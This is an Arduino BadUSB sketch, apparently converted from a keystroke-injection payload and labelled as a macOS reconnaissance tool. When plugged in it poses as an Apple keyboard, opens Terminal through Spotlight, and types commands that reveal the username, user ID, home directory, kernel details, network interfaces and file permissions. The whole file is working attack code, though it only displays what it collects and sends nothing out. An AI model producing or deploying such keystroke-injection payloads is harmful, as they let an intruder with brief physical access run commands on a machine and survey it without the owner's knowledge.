// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // User Information: Includes the username, home directory, and user ID.
  // System Information: Displays details about the operating system.
  // Network Information: Shows network interface information IP address.
  // File and Directory Permissions: Provides permissions and ownership details of files and directories.
  // Author: Narsty
  // Title: SysNet Info
  // Target: MacOS
  // Version: 1.0
  // Category: Recon
  // ID 05ac:021e Apple:Keyboard
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("echo \"User Information:\" && echo \"Username: $(whoami)\" && echo \"Home Directory: $HOME\" && echo \"User ID: $(id -u)\" && echo && echo \"System Information:\" && uname -a && echo && echo \"Network Information:\" && ifconfig && echo && echo \"File and Directory Permissions:\" && ls -l");

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}